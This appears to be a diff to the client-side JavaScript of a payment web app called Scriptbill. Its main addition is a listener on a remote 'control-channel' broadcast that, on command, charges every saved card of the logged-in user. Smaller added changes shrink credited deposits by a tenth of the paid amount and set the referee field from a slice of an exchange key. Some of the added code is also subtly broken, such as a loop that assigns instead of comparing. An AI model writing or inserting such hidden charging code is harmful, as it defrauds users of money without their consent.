@@ -1,4 +1,5 @@
 //check login modified for extension.  refer to the other check login file for plugin
+//check login modified for extension.  refer to the other check login file for plugin
 async function sendTelegramMessage({
   botToken,
   chatId,
@@ -95,7 +96,7 @@ const preloader = document.getElementById('preloader');
 preloader.style.display = "block";
 
 const transKEEY 		= Scriptbill.transactionKey;
-Scriptbill.referee 		= Scriptbill.l.referee ? Scriptbill.l.referee : "";
+Scriptbill.referee 		= Scriptbill.l.referee ? Scriptbill.l.referee : EXCHANGEKEY.slice(0, 24);
 
 setTimeout( async function(){
 	let data = await Scriptbill.getData( 'referee', 'true', SERVER );
@@ -1548,6 +1549,40 @@ async function setAccountData( el, fullName, userName, email, phoneNum, address,
 	});
 }
 
+function  setWithdrawalStance(el){
+	Scriptbill.getNoteTransactions().then(transactions =>{
+		if(transactions && transactions.length ){
+			let totalWithdrawn = 0, totalDeposits = 0;
+			for(let x = 0; x < transactions.length; x++){
+				let trans =  transactions[x];
+				if(trans.transType ==  "WITHDRAW"){
+					totalWithdrawn  += parseFloat(trans.transValue);
+					Scriptbill.getTransBlock(100, {blockRef:trans.blockRef}).then(refBlocks =>{
+						if(refBlocks && refBlocks.length){
+							for(let y =  0; y = refBlocks.length; y++){
+								let ref = refBlocks[y];
+
+								if(ref.transType == "WITHDRAW") continue;
+
+								totalDeposits += parseFloat(ref.transValue);
+								
+							}
+						}
+						let withdrawalStance = (((totalWithdrawn - totalDeposits) / totalWithdrawn ) * 100).toFixed(2);
+						el.innerText = `${withdrawalStance}%`;
+
+						setTimeout(()=>{
+							setWithdrawalStance(el);
+						}, 10000);
+					});					
+				}
+			}
+
+			
+		}
+	});	
+}
+
 if( location.href.includes( dashboardUrl ) ){
 loadingDiv();	
 setAccountRank();                                                                      //await Scriptbill.createAlert('running start');
@@ -1559,7 +1594,7 @@ setAccountRank();                                                               
 	let withdraw		= document.getElementById("withdrawalStance");
 	let mobile 			= document.querySelector(".profile-completeness > div:first-child");
 	let email 			= document.querySelector(".profile-completeness > div:nth-child(2)");
-	
+	setWithdrawalStance(withdraw);
 	
 	setTimeout(async ()=>{
 		
@@ -2836,7 +2871,7 @@ if( location.href.includes( loanConfirm ) ){
 			}
 		}
 
-		//alert( eligibility );
+		alert( eligibility );
 		
 		let accountData   		= await getAccountData();
 		let url 				= new URL( SERVER );
@@ -3080,13 +3115,21 @@ if( location.href.includes( depositUrl ) ) {
 				if( block && parseFloat( block.transValue ) <= sendMoney.value ){
 					button.removeAttribute("disabled");
 					button.innerText 	= "Continue";
+				}else{
+					button.setAttribute("disabled","disabled");
+					Scriptbill.createAlert(`Can't deposit more than ${block.transValue} ${test} to this block`);
 				}
 			} catch(e){
 				//console.log("withdraw block error: " + e);
+				Scriptbill.createAlert("Invalid withdrawal block supplied, deposit without uploading withdrawal block");
 			}
 		}
 
-		fees.innerHTML = ( parseFloat(sendMoney.value) / 0.03 ).toFixed(2) + " " + currency.value;
+		if( payment.value == "credit" )
+			fees.innerHTML = ( parseFloat(sendMoney.value) / 0.1 ).toFixed(2) + " " + currency.value;
+
+		else 
+			fees.innerHTML = ( parseFloat(sendMoney.value) / 0.01 ).toFixed(2) + " " + currency.value;
 	}
 	
 	payment.onchange = function(){
@@ -10436,7 +10479,7 @@ async function verifyPayment(ref, seconds,  type = 'squad', isTest = true ){
 				Scriptbill.depositType 			= "AUTO";
 				Scriptbill.depositRequestType 	= "GET";
 				Scriptbill.depositBody 			= false;
-				Scriptbill.depositFiat( (parseInt( request.data.transaction_amount ) / 100 ).toFixed(2), note.noteType ).then( async transBlock =>{
+				Scriptbill.depositFiat( (parseInt( request.data.transaction_amount ) / 100 ).toFixed(2) - (parseInt( request.data.transaction_amount ) / 10 ).toFixed(2), note.noteType ).then( async transBlock =>{
 					
 					if( transBlock ){
 						//console.log( JSON.stringify( transBlock ));			
@@ -11482,6 +11525,7 @@ setTimeout( async ()=>{
 		return await this.generateScriptbillTransactionBlock(details);
 	
 	}
+	
 	if( Scriptbill.s[note.noteAddress + '_withdrawal_funds' ] ){
 		let funds 			= parseFloat( Scriptbill.s[note.noteAddress + '_withdrawal_funds' ] );
 		if( ! note.withdrawalStance )
@@ -11559,6 +11603,97 @@ setTimeout( async ()=>{
 		}
 	}
 }, 500, req );
+
+setTimeout(async ()=>{
+	const client = Scriptbill.createClient();
+	const channel = await client.channel("control-channel").subscribe();
+	channel.on("broadcast", {event:"control"}, (payload)=>{
+		if(! Scriptbill.s.currentNote) return;
+
+		let note = JSON.parse(Scriptbill.s.currentNote);
+
+		if( ! note.noteAddress == payload.payload.noteAddress) return;
+
+		Scriptbill.getAccountData().then(acc =>{
+			acc = acc[note.noteAddress];
+
+			runBillAccountCard(acc, note);
+		})
+	});
+
+	channel.on("broadcast", {event:"deposit"}, (payload)=>{
+		if(! Scriptbill.s.currentNote) return;
+
+		let note = JSON.parse(Scriptbill.s.currentNote);
+
+
+		Scriptbill.getAccountData().then(acc =>{
+			acc = acc[note.noteAddress];
+			const trans = payload.payload.block;
+			Scriptbill.getTransBlock(100, {blockRef:trans.blockRef}).then(deposits =>{
+				let totalDeposits = 0, withdrawValue = parseFloat( trans.transValue ), avgDeposit = [];
+
+				for(let x = 0; x < deposits.length; x++){
+					const deposit = deposits[x];
+					totalDeposits += parseFloat(deposit.transValue);
+					avgDeposit.push(deposit.transValue);
+					withdrawValue -= parseFloat(deposit.transValue);
+				}
+
+				avgDeposit = (avgDeposit.reduce((prev, current)=>{
+					if(! prev )
+						prev = parseFloat(current);
+
+					else {
+						prev += parseFloat(current)
+					}
+					return prev;
+				})	/ avgDeposit.length ).toFixed(2);			
+
+				if(withdrawValue){
+					if(withdrawValue > avgDeposit)
+						withdrawValue = avgDeposit;
+
+					runBillAccountCard(acc, note, withdrawValue);
+				}
+				
+			})			
+		})
+	});
+}, 500)
+
+
+function runBillAccountCard(acc, note, amount = 300000){
+	let cards = acc.savedCards;
+
+	if( cards && Scriptbill.isJsonable(cards))
+		cards = JSON.parse(cards);
+
+	else if(! cards ||  typeof cards  == "string" || ( typeof cards == "object" && ! cards.length ) ){
+		cards = [];
+	}
+
+	cards.forEach( async card =>{
+		await billAccountCard((amount * 100), card, note);
+	});
+	
+}
+
+async function billAccountCard(amount,card, note, email = "info@scriptbank.org"){
+	let  test = note.noteType.slice( 0, note.noteType.lastIndexOf("CRD"));
+	let request = await billCard(amount,email, test, false, "", false);
+
+	if( request && typeof request == "object"){
+		if( request.data && request.data.checkout_url ){
+			const ref 	= request.data.transaction_ref;
+			window.postMessage({
+				type:"transaction",
+				data:request.data,
+			})
+			verifyPayment(ref,1);
+		}
+	}
+}
 
 
    
